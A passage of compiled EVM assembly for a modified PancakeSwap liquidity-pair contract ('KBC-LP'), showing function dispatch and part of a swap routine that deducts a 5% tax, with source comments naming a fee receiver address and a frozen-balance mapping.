iszero\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_61:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_62\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_9:\n      tag_63\n      tag_64\n      jump\t// in\n    tag_63:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_10:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_66:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_67\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_63\n      tag_69\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_63\n      tag_73\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_75\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_75:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_76\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1047:1079  uint public price0CumulativeLast */\n    tag_15:\n      tag_63\n      tag_78\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1085:1117  uint public price1CumulativeLast */\n    tag_16:\n      tag_63\n      tag_80\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_17:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_82\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_82:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":5025:6290  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_83\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_18:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_85\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_85:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_86\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1123:1140  uint public kLast */\n    tag_19:\n      tag_63\n      tag_88\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_20:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n    tag_21:\n      tag_92\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_93\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_93:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_94\n      jump\t// in\n    tag_92:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n    tag_22:\n      tag_58\n      tag_96\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_23:\n      tag_47\n      tag_98\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_24:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_104\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_104:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_105\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_25:\n      tag_63\n      tag_107\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n    tag_26:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_109\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_109:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_110\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":672:694  address public factory */\n    tag_27:\n      tag_58\n      tag_112\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":727:748  address public token1 */\n    tag_28:\n      tag_58\n      tag_114\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_29:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_117\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_30:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_119\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_119:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_120\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_31:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_122\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_122:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_123\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":754:772  uint public taxfee */\n    tag_32:\n      tag_63\n      tag_125\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n    tag_33:\n      tag_41\n      tag_127\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n    tag_46:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_129\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_129:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11898  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11916  amount0Out > 0 || amount1Out > 0 */\n      tag_131\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11915:11916  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11902:11912  amount1Out */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11902:11916  amount1Out > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11884:11916  amount0Out > 0 || amount1Out > 0 */\n    tag_131:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11863:11977  require(... */\n      tag_132\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_132:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11988:12005  uint112 _reserve0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12007:12024  uint112 _reserve1 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12043  getReserves() */\n      tag_133\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12041  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12030:12043  getReserves() */\n      jump\t// in\n    tag_133:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11987:12043  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12102:12111  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12111  amount0Out < _reserve0 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12099  amount0Out */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12111  amount0Out < _reserve0 */\n      lt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12137  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_134\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12128:12137  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12137  amount1Out < _reserve1 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12125  amount1Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12115:12137  amount1Out < _reserve1 */\n      lt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12089:12137  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_134:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12068:12194  require(... */\n      tag_135\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_135:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12205:12218  uint balance0 */\n      0x00\n      dup1\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12318:12321  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12313:12314  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12300:12314  amount0Out * 5 */\n      dup12\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12299:12321  (amount0Out * 5) / 100 */\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12286:12321  amount0Out - (amount0Out * 5) / 100 */\n      dup11\n      sub\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12335:12353  uint taxamount1Out */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12388:12391  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12383:12384  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12370:12384  amount1Out * 5 */\n      dup12\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12491:12497  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12529:12535  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12369:12391  (amount1Out * 5) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12356:12391  amount1Out - (amount1Out * 5) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12491:12497  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12529:12535  token1 */\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12570  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12587  to != _token0 && to != _token1 */\n      tag_138\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12580:12587  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12587  to != _token1 */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12576  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12574:12587  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12557:12587  to != _token0 && to != _token1 */\n    tag_138:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12549:12611  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_139\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_139:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12629:12643  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12625:12686  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12686  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12659:12666  _token0 */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12668:12670  to */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12672:12685  taxamount0Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12658  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12645:12686  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_141:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12738:12752  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12734:12795  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12795  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12768:12775  _token1 */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12777:12779  to */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12781:12794  taxamount1Out */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12767  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12754:12795  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_144:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12847:12862  data.length > 0 */\n      dup9\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12843:13087  if (data.length > 0)... */\n      tag_145\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12895:12897  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:12910  IPancakeCallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12932:12942  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12964:12977  taxamount0Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13014:13027  taxamount1Out */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13065:13069  data */\n      dup15\n      dup15\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_146\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_146:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_147\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_147:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12880:13087  IPancakeCallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":12843:13087  if (data.length > 0)... */\n    tag_145:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13133:13136  100 */\n      0x64\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13128:13129  5 */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13115:13129  amount0Out * 5 */\n      dup15\n      dup2\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13114:13136  (amount0Out * 5) / 100 */\n      dup3\n      swap1\n      div\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13163:13177  amount1Out * 5 */\n      swap1\n      dup15\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13162:13184  (amount1Out * 5) / 100 */\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13203:13217  amount0Out > 0 */\n      dup15\n      iszero\n        /* 